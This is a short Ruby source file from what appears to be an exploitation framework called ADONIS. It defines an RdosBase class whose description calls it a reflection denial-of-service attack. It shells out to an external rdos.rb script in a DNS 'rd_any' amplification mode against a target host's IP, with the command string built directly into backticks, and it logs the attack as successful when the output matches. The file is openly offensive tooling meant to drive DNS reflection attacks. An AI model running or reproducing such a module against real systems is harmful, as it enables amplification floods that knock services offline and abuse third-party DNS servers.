#encoding: utf-8

require 'thread'

module ADONIS
module EXPLOIT

class RdosBase < Base

    def rdos_init id, service_name, father_node_name
        name = "dos_#{service_name}"
        desc = "#{service_name}反射拒绝服务攻击"
        exploit_init(id, name, father_node_name, 50, desc)
	if ['dns'].include?(service_name) 
		@service = service_name
	else 
		@service = nil
	end
        set_default_cmd
    end

    def set_default_cmd
        @cmd = File.join(::ADONIS::BinDir, "rdos.rb")
	@cmd += " -p dns_rd_any" if @service == 'dns'
    end

    def exploit_func host
	port = host.get_tmp_msg 'port'
        command = "#{@cmd} -R #{host.ip} -q baidu.com -t"
        ::ADONIS.exploit_logger.info("#{self.class}, exploit_func #{id}: #{host.ip} by command: #{command}" )
        out = `#{command}`
        if out =~ /check success/
            return exploit_success 'true', port ,@service
        else
            return exploit_failed 'false'
        end
    end

end

end
end

